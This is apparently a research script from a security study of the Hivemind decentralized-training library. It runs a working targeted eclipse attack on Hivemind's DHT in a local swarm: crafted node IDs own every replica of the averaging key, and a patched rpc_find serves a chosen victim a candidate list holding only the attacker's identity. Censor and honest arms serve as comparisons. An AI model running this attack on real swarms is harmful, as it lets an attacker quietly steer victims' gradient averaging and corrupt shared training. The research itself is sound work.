"""
Step 5 -- lie to the victim on read, instead of censoring everyone on write.

`step3_candidates.py` reached 100 % of the victim's candidate list by owning every
replica of the averaging key and refusing to *store* honest advertisements. That
works, but it is loud in two ways:

  * every honest peer's `declare_averager` returns False, so the DHT tells all 32 of
    them their advertisement was refused -- a detection signal sitting unused
    (`matchmaking.py:535,544` await the call and discard the result);
  * discovery breaks for the whole swarm, not just the victim, so training stalls
    for everyone. That is operationally obvious.

A quieter attack exists. `rpc_find` receives `context: P2PContext`
(`hivemind/dht/protocol.py:333`), so a node serving a read knows the
TLS-authenticated PeerID of whoever is asking, before it builds the response. An
attacker owning the replicas can therefore **store everything honestly, serve
everyone honestly, and lie only to the victim** -- returning a candidate list
containing just its own identity. Same five identities, no detection signal, no
collateral damage.

Three arms:

    honest      no attacker; the control
    censor      the step3 attack -- reject honest writes (record_validator)
    selective   store honestly, filter the victim's reads only

Measured for each: whether honest peers' declarations succeed (the detection
signal), what the *victim* sees, and what an uninvolved *bystander* sees. The
bystander is what separates a targeted attack from a broken swarm.

Two mechanisms limit the selective attack, and both are measured rather than
assumed:

  * candidate dictionaries from several responders are **merged**
    (`node.py:834-838`), so every responder must lie the same way -- which is why
    total custody (`step3_eclipse.py`: five identities) is a precondition;
  * `rpc_find` also answers from `self.cache` (`protocol.py:344`), and caching is
    on by default, so an honest peer on the lookup path can hand the victim a
    cached honest copy. Run with `--caching` to measure that leak.

Run:
    .venv/bin/python research/hivemind/step5_selective.py
    .venv/bin/python research/hivemind/step5_selective.py --caching
"""

from __future__ import annotations

import argparse
import asyncio
import csv
import time
from pathlib import Path

from hivemind.averaging.key_manager import GroupKeyManager
from hivemind.dht.node import DHTNode
from hivemind.dht.protocol import DHTProtocol
from hivemind.dht.routing import DHTID
from hivemind.dht.storage import DictionaryDHTValue
from hivemind.dht.validation import DHTRecord, RecordValidatorBase
from hivemind.p2p import PeerID
from hivemind.proto import dht_pb2
from hivemind.utils.timed_storage import get_dht_time

RESULTS_DIR = Path(__file__).resolve().parent / "results"
LOCALHOST = ["/ip4/127.0.0.1/tcp/0"]

PREFIX = "step2_grad_averager"
GROUP_KEY = f"{PREFIX}.0b"  # what GroupKeyManager builds with the default empty group_bits


# --------------------------------------------------------------------------
# The selective liar
# --------------------------------------------------------------------------
# Patch the class *before* any node exists: handlers are bound at registration
# (`getattr(servicer, method_name)`, hivemind/p2p/servicer.py:117), so replacing
# the method afterwards would not be seen. Honest nodes have no `_selective`
# attribute and fall straight through to the original, so this global patch
# changes nothing for them. Nothing under hivemind/ is edited on disk.

_ORIGINAL_RPC_FIND = DHTProtocol.rpc_find


async def _selective_rpc_find(self, request: dht_pb2.FindRequest, context) -> dht_pb2.FindResponse:
    response = await _ORIGINAL_RPC_FIND(self, request, context)

    config = getattr(self, "_selective", None)
    if config is None or context.remote_id != config["victim"]:
        return response  # honest node, or a reader we are not targeting

    for index, key_id in enumerate(map(DHTID.from_bytes, request.keys)):
        if key_id != config["key_id"]:
            continue  # every other key is answered truthfully
        item = response.results[index]
        if item.type != dht_pb2.FOUND_DICTIONARY:
            continue

        # Advertisements live in a dictionary keyed by each advertiser's PeerID
        # bytes (`key_manager.py:60` passes `peer_id.to_bytes()` as the subkey).
        # Keep the attacker's, drop the rest.
        original = self.serializer.loads(item.value)
        filtered = DictionaryDHTValue(maxsize=original.maxsize)
        for subkey, entry in original.items():
            if subkey in config["allowed"]:
                filtered.store(subkey, entry.value, entry.expiration_time)
        item.value = self.serializer.dumps(filtered)
        config["lies"] += 1

    return response


DHTProtocol.rpc_find = _selective_rpc_find


class RejectForeignAdvertisements(RecordValidatorBase):
    """The step3 attack, for comparison: refuse to store anyone else's advertisement.

    `record_validator` is a supported `DHTNode.create` argument and runs inside
    `rpc_store` before anything is written (`protocol.py:248,260`).
    """

    def __init__(self, target_key: str, allowed: list[PeerID]):
        self._target = DHTID.generate(source=target_key).to_bytes()
        self._allowed = [peer_id.to_bytes() for peer_id in allowed]

    def validate(self, record: DHTRecord) -> bool:
        if record.key != self._target:
            return True
        return any(allowed in record.subkey for allowed in self._allowed)


class NodeAsDHT:
    """Lets `GroupKeyManager` drive a `DHTNode` directly.

    The experiment needs `DHTNode` rather than `DHT`, because the selective liar has
    to reach `node.protocol`, and `DHT` hides its node inside a forked subprocess.
    `GroupKeyManager` only ever calls `dht.store(...)` and `dht.get(...)` with
    `return_future=True` (`key_manager.py:62,86`), which is a `DHT`-only argument, so
    this forwards those two calls and drops it. The real `GroupKeyManager` still does
    the work -- key construction, subkey choice and parsing are Hivemind's, not ours.
    """

    def __init__(self, node: DHTNode):
        self._node = node
        self.peer_id = node.peer_id

    async def store(self, *args, return_future: bool = False, **kwargs):
        return await self._node.store(*args, **kwargs)

    async def get(self, *args, return_future: bool = False, **kwargs):
        return await self._node.get(*args, **kwargs)


def group_key_manager(node: DHTNode) -> GroupKeyManager:
    return GroupKeyManager(NodeAsDHT(node), prefix=PREFIX, initial_group_bits="", target_group_size=None)


def crafted_node_ids(target_key: str, count: int) -> list[DHTID]:
    """node_ids at XOR distance 0, 1, ... from the key's address (see step3_eclipse.py)."""
    target = DHTID.generate(source=target_key)
    return [DHTID(int(target) ^ i) for i in range(count)]


# --------------------------------------------------------------------------
# One measurement
# --------------------------------------------------------------------------


async def run_arm(arm: str, args) -> dict:
    cache_opts = (
        {}
        if args.caching
        else dict(cache_locally=False, cache_nearest=0, cache_on_store=False, cache_size=0)
    )

    bootstrap = await DHTNode.create(host_maddrs=LOCALHOST, **cache_opts)
    initial = [str(addr) for addr in await bootstrap.get_visible_maddrs()]

    honest = [
        await DHTNode.create(initial_peers=initial, host_maddrs=LOCALHOST, **cache_opts)
        for _ in range(args.num_honest)
    ]
    victim, bystander = honest[0], honest[1]

    # The identity the attacker wants the victim to average with.
    attacker_ad = PeerID(bytes([0x00, 0x24]) + b"\xAB" * 34)

    # Warm the swarm before the attacker arrives.
    #
    # Without this the measurement is a cold first read: the key has never been
    # looked up, so no peer holds a cached copy and the attacker's replicas are the
    # only possible source. A real network has been reading this key for hours.
    # It matters because `add_candidate` *merges* dictionaries from every responder
    # (`node.py:834-837`), so one honest peer answering from cache reintroduces
    # every honest entry -- and `cache_nearest=1` (`node.py:112`) plants exactly
    # such a copy on a peer along the path after each successful lookup.
    warm_expiration = get_dht_time() + args.warm_expiration
    for _ in range(args.warmup):
        for peer in honest:
            await group_key_manager(peer).declare_averager(
                GROUP_KEY, peer.peer_id, expiration_time=warm_expiration
            )
        for peer in honest:
            await group_key_manager(peer).get_averagers(GROUP_KEY, only_active=True)

    # Let the warm-up records expire before the attacker arrives. Real averaging
    # advertisements are short-lived -- `declare_averager` sets expiration to the
    # peer's matchmaking deadline, seconds not minutes (`matchmaking.py:527-531`) --
    # so in steady state every copy of the key is refreshed continuously. Whether
    # the attack is permanently defeated by history or merely delayed by one record
    # lifetime is exactly the difference between these two settings.
    if args.settle:
        await asyncio.sleep(args.settle)

    attackers = []
    if arm != "honest":
        for node_id in crafted_node_ids(GROUP_KEY, args.num_attackers):
            validator = (
                RejectForeignAdvertisements(GROUP_KEY, [attacker_ad]) if arm == "censor" else None
            )
            node = await DHTNode.create(
                initial_peers=initial,
                host_maddrs=LOCALHOST,
                node_id=node_id,
                record_validator=validator,
                **cache_opts,
            )
            if arm == "selective":
                # Same process and event loop, so the protocol object is reachable
                # directly -- no need to thread configuration through a fork.
                node.protocol._selective = dict(
                    victim=victim.peer_id,
                    key_id=DHTID.generate(source=GROUP_KEY),
                    allowed={attacker_ad.to_bytes()},
                    lies=0,
                )
            attackers.append(node)

    expiration = get_dht_time() + 600

    # 1. every honest peer advertises, and we record whether the DHT accepted it
    declared_ok = 0
    for peer in honest:
        manager = group_key_manager(peer)
        if await manager.declare_averager(GROUP_KEY, peer.peer_id, expiration_time=expiration):
            declared_ok += 1

    # 2. the attacker advertises its own identity
    if arm != "honest":
        writer = group_key_manager(attackers[0])
        await writer.declare_averager(GROUP_KEY, attacker_ad, expiration_time=expiration)

    # 3. read the list back, as the victim and as an uninvolved bystander
    async def candidate_list(node):
        reader = group_key_manager(node)
        found = await reader.get_averagers(GROUP_KEY, only_active=True)
        seen = {peer_id.to_bytes() for peer_id, _expiration in found}
        honest_ids = {peer.peer_id.to_bytes() for peer in honest}
        return dict(
            total=len(seen),
            honest_visible=len(seen & honest_ids),
            attacker_visible=int(attacker_ad.to_bytes() in seen),
        )

    victim_view = await candidate_list(victim)
    bystander_view = await candidate_list(bystander)

    lies = sum(getattr(node.protocol, "_selective", {}).get("lies", 0) for node in attackers)

    for node in [bootstrap, *honest, *attackers]:
        await node.shutdown()

    return dict(
        arm=arm,
        caching=args.caching,
        warmup=args.warmup,
        settle=args.settle,
        warm_expiration=args.warm_expiration,
        num_honest=args.num_honest,
        num_attackers=len(attackers),
        alpha=len(attackers) / (args.num_honest + len(attackers)) if attackers else 0.0,
        honest_declarations_accepted=declared_ok,
        honest_declarations_total=len(honest),
        victim_list_size=victim_view["total"],
        victim_sees_honest=victim_view["honest_visible"],
        victim_sees_attacker=victim_view["attacker_visible"],
        bystander_list_size=bystander_view["total"],
        bystander_sees_honest=bystander_view["honest_visible"],
        bystander_sees_attacker=bystander_view["attacker_visible"],
        selective_responses_filtered=lies,
    )


# --------------------------------------------------------------------------


async def main_async(args) -> None:
    rows = []
    for arm in args.arms:
        print(f"=== arm: {arm} (caching={args.caching}, warmup={args.warmup}) ===")
        started = time.perf_counter()
        row = await run_arm(arm, args)
        row["seconds"] = round(time.perf_counter() - started, 1)
        rows.append(row)
        print(
            f"  honest declarations accepted : {row['honest_declarations_accepted']}"
            f"/{row['honest_declarations_total']}"
        )
        print(
            f"  victim sees                  : {row['victim_sees_honest']} honest, "
            f"{row['victim_sees_attacker']} attacker  (list size {row['victim_list_size']})"
        )
        print(
            f"  bystander sees               : {row['bystander_sees_honest']} honest, "
            f"{row['bystander_sees_attacker']} attacker  (list size {row['bystander_list_size']})"
        )
        if arm == "selective":
            print(f"  responses filtered for victim: {row['selective_responses_filtered']}")
        print(f"  ({row['seconds']}s)\n")

    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    suffix = ("_cached" if args.caching else "") + (f"_warm{args.warmup}" if args.warmup else "") + (f"_settle{args.settle:g}" if args.settle else "")
    path = RESULTS_DIR / f"step5_selective{suffix}.csv"
    with open(path, "w", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)
    print(f"wrote {path}")

    print("\nsummary")
    print(f"{'arm':<11} {'honest decl':>12} {'victim: honest/att':>20} {'bystander: honest/att':>22}")
    for row in rows:
        print(
            f"{row['arm']:<11} "
            f"{row['honest_declarations_accepted']:>5}/{row['honest_declarations_total']:<6} "
            f"{row['victim_sees_honest']:>10}/{row['victim_sees_attacker']:<9} "
            f"{row['bystander_sees_honest']:>12}/{row['bystander_sees_attacker']:<9}"
        )
    print("\nA targeted attack keeps honest declarations accepted and the bystander's view intact,")
    print("while the victim sees only the attacker. A broken swarm shows damage in every column.")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--num-honest", type=int, default=16)
    parser.add_argument("--num-attackers", type=int, default=5, help="5 owns every replica; see step3_eclipse.py")
    parser.add_argument("--arms", nargs="+", default=["honest", "censor", "selective"])
    parser.add_argument("--caching", action="store_true", help="leave DHT caching on; measures the leak")
    parser.add_argument("--warm-expiration", type=float, default=600.0,
                        help="lifetime of warm-up records; real averaging ads live seconds, not minutes")
    parser.add_argument("--settle", type=float, default=0.0,
                        help="seconds to wait after warm-up so its records can expire before the attack")
    parser.add_argument("--warmup", type=int, default=0,
                        help="rounds of honest declare+read before the attacker joins, to populate caches")
    args = parser.parse_args()
    asyncio.run(main_async(args))


if __name__ == "__main__":
    main()
